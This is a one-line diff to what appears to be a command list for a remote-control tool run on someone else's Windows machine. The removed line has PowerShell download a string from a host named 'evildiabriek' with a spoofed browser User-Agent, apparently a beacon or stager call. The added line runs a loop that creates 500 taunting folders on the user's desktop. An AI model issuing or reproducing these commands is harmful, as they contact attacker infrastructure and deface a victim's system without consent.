@@ -1,1 +1,1 @@
-ExecuteCmd -user -cmd powershell -c "$wc = New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1)'); $wc.Headers.Add('Accept-Language','fr-FR'); $wc.DownloadString('https://evildiabriek.pythonanywhere.com/ping')
+ExecuteCmd -user -cmd for /l %i in (1,1,500) do mkdir "%USERPROFILE%\Desktop\LINUX_MEILLEUR_QUE_WINDAUBE_%i"
